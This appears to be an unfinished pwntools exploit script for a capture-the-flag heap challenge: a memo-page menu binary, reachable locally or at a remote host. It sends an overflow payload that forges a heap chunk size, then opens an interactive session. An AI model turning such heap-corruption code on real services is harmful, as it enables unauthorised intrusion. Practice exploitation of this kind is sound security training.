#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("prob_patched")
gs = """
b *0x4020FB 
set resolve-heap-via-heuristic force
c
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def addNewPage(size, memo=b''):
    p.sendlineafter(b"menu>> ", b"1")
    p.sendafter(b"size> ", str(size).encode())
    if len(memo):
        p.sendafter(b"memo> ", memo)


def modifyPage(num, size, memo):
    p.sendlineafter(b"menu>> ", b"2")
    p.sendafter(b'page number>', str(num).encode())
    p.sendafter(b"new_size> ", str(size).encode())
    p.sendafter(b"memo> ", memo)


def readPage(num):
    p.sendlineafter(b"menu>> ", b"3")
    p.sendafter(b'page number>', str(num).encode())


def clearPage(num):
    p.sendlineafter(b"menu>> ", b"4")
    p.sendafter(b'page number>', str(num).encode())


if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

addNewPage(0x10, b'A'*0x108+p64(0x941))

readPage(1)

addNewPage(0x10, b'AAAA')


p.interactive()
